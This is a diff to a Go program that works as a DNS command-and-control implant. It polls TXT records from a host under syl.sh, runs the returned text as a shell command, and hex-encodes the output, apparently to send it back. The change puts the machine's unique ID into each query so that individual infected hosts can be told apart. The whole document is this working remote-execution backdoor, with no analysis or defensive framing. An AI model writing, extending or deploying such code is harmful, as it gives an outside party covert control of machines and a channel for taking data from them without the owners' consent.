@@ -18,13 +18,11 @@ const (
 	delay     = 500 * time.Millisecond
 )
 
-var questionBeamUri = "0.0.0.syl.sh."
-
 func main() {
 	machineId, _ := machineid.ID()
+	var questionBeamUri = "0." + machineId + ".0.syl.sh."
 	m := new(dns.Msg)
 	m.SetQuestion(questionBeamUri, dns.TypeTXT)
-
 	for {
 		r, _ := dns.Exchange(m, host)
 		if r != nil {
@@ -35,11 +33,8 @@ func main() {
 					}
 
 					cmd := strings.Split(txt.Txt[0], " ")
-
 					fmt.Printf("Recevied cmd: %s\n", cmd)
-
 					nm := new(dns.Msg)
-
 					out, _ := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
 
 					chunkOutEnc := hex.EncodeToString(out)
